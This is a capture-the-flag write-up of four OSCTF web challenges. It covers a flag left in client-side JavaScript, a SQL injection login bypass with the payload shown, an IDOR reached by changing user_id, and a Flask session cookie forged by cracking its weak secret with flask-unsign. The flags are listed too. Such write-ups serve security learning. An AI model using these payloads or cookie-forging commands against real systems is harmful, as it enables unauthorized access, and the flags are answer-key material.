# Introspection
## Description
> Welcome to the Secret Agents Portal. Find the flag hidden in the secrets of the Universe!!!

## Solution
The flag was present inside [script.js](http://34.16.207.52:5134/script.js)

## Flag
```
OSCTF{Cr4zY_In5P3c71On}
```

# Styled Query Listing
## Description
> pfft.. Listen, I’ve gained access to this login portal but I’m not able to log in. The admins are surely hiding something from the public, but… I don’t understand what. Here take the link and be quiet, don’t share it with anyone
## Solution

- There was sqli in the username and password fields
- Username = admin and Password = `a' or '1' = '1'; -- - ` gives the flag

## Flag

```
OSCTF{D1r3ct0RY_BrU7t1nG_4nD_SQL}
```
# Indoor Webapp
## Description
> The production of this application has been completely indoor so that no corona virus spreads, but that’s an old talk right?
## Solution

- On clicking the view profile button we are shown the [profile](http://34.16.207.52:2546/profile?user_id=1) of user_id=1
- On changing the user_id parameter to 2 we get the flag.

## Flag

```
OSCTF{1nd00r_M4dE_n0_5enS3}
```
# Action Notes
## Solution

Look at the cookies for one labeled "session." Initially, it seems to be a JWT, but decoding it directly results in an error.
```
session:eyJ1c2VybmFtZSI6InRlc3QyMTMifQ.ZpKirg.NeEcUdx51_beLfIjFVIdC60Jqj8
```
Use the flask-unsign tool to extract the secret key from the cookie. Run the command:

```bash
flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6InRlc3QyMTMifQ.ZpKirg.NeEcUdx51_beLfIjFVIdC60Jqj8"
```
This reveals the secret key, ```supersecretkey```.

With the secret key, create your own signed cookie. Use the ```flask-unsign tool``` to sign a new cookie with the desired payload. Replace the old cookie with the newly signed cookie and visit the /admin page. This allows you to access the admin section and retrieve the flag.
```bash
flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'supersecretkey'
```
Flag
```
OSCTF{Av0id_S1mpl3_P4ssw0rDs}
```
